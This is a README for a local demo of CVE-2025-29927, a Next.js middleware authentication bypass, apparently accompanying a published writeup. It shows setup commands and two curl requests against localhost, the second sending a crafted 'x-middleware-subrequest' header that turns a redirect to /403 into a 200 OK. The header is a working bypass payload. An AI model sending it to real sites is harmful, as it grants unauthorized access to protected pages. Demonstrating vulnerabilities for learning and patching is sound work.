# CVE-2025-29927 Demo

Original writeup: https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware

## Setup

First, run the development server:

```bash
npm i
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.

## Trying out the bypass

`curl -I http://localhost:3000`

```http
HTTP/1.1 307 Temporary Redirect
location: /403
Date: Mon, 24 Mar 2025 08:02:50 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

`curl -I -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3000`

```http
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
link: </_next/static/media/569ce4b8f30dc480-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2", </_next/static/media/93f479601ee12b01-s.p.woff2>; rel=preload; as="font"; crossorigin=""; type="font/woff2", </_next/static/css/app/layout.css?v=1742803407039>; rel=preload; as="style"
Cache-Control: no-store, must-revalidate
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
Date: Mon, 24 Mar 2025 08:03:27 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
